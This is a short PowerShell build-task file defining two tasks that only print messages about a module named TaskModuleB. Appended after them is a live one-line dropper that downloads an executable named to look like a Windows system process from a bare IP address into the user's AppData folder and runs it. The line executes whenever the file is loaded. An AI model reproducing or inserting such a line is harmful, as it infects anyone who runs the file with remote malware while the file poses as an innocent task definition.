
task TaskAFromModuleB {
    'Executing [TaskA] from module [TaskModuleB] version [0.1.0]'
}

task TaskBFromModuleB {
    'Executing [TaskB] from module [TaskModuleB] version [0.1.0]'
}

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

